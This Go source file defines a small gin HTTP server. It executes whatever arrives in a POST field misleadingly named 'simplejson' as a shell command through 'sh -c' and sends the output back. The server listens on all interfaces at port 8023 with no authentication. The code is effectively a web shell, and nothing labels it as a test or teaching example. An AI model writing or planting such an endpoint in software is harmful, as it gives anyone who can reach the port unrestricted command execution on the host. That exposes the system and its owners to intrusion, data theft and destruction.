package simpleGinn

import (
	"fmt"
	"github.com/gin-gonic/gin"
	"log"
	"net/http"
	"os/exec"
)

func zhaoll(c *gin.Context) {
	simplejson := c.PostForm("simplejson")
	//name := c.PostForm("username")
	//fmt.Printf("==")
	//fmt.Printf(name)
	//fmt.Printf(simplejson)
	//fmt.Printf("==")
	cmd := exec.Command("sh","-c",simplejson)
	out, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Printf("combined out:\n%s\n", string(out))
		log.Fatalf("cmd.Run() failed with %s\n", err)
	}
	fmt.Printf("combined out:\n%s\n", string(out))

	//c.JSON(http.StatusOK, gin.H{
	//	"simplejson": string(out),
	//})
	c.String(http.StatusOK, string(out))
}


func SimpleGinn () *gin.Engine {
	//return x + y
	gin.SetMode(gin.ReleaseMode)
	router := gin.Default()
	router.POST("", zhaoll)
	return router
}



func main() {
	router := SimpleGinn()
	router.Run("0.0.0.0:8023")
}